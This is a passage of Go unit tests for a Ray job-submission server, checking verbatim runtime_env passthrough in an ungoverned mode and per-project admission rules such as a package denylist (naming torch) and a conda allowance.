	if _, err := s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body}); err != nil {
		t.Fatalf("ungoverned mode must pass any runtime_env through: %v", err)
	}
	stored, _ := store.GetRayJob(context.Background(), "job-raw")
	if stored == nil || stored.Spec.RuntimeEnvYaml != evil {
		t.Fatalf("stored env = %+v, want the verbatim passthrough", stored)
	}
}

// The AdmissionRule runtime-env knobs (#52) are live (#55): the validator
// reads the project's effective rule set, so a package denylist or a
// permitted field is API-editable per project instead of a platform-wide
// hardcode. A project with no knobs set gets the governed defaults.
func TestSubmitJobReadsRuntimeEnvKnobsFromTheAdmissionRule(t *testing.T) {
	store := newMemStore(t)
	s := &Server{Store: store, PolicySeed: PolicyConfig{Admission: map[string]core.AdmissionRule{
		"team-a": {PackageDenylist: []string{"torch"}, AllowConda: true},
	}}}
	admin := testIdentity("admin", auth.RoleAdmin)

	submitWithEnv := func(jobID, project, env string) int {
		body := jobBodyFor(project)
		body.Id = strPtr(jobID)
		body.Spec.RuntimeEnvYaml = &env
		_, err := s.SubmitJob(ctxWithIdentity(admin), SubmitJobRequestObject{Body: &body})
		return okOr(t, err)
	}

	// team-a's denylist refuses a pinned torch the governed defaults would
	// have admitted; team-b (no rule) still admits it.
	if got := submitWithEnv("job-denied", "team-a", "pip: [torch==2.1.0]"); got != http.StatusBadRequest {
		t.Errorf("denylisted package = %d, want 400", got)
	}
	if got := submitWithEnv("job-defaults", "team-b", "pip: [torch==2.1.0]"); got != http.StatusOK {
		t.Errorf("no rule = governed defaults, want accepted; got %d", got)
	}
	// team-a's allow_conda permits what the defaults deny; team-b is still
	// refused.
	if got := submitWithEnv("job-conda", "team-a", "conda:\n  dependencies: [python=3.11]"); got != http.StatusOK {
		t.Errorf("allow_conda project = %d, want accepted", got)
	}
	if got := submitWithEnv("job-conda-b", "team-b", "conda:\n  dependencies: [python=3.11]"); got != http.StatusBadRequest {
		t.Errorf("conda without the knob = %d, want 400", got)
	}
}
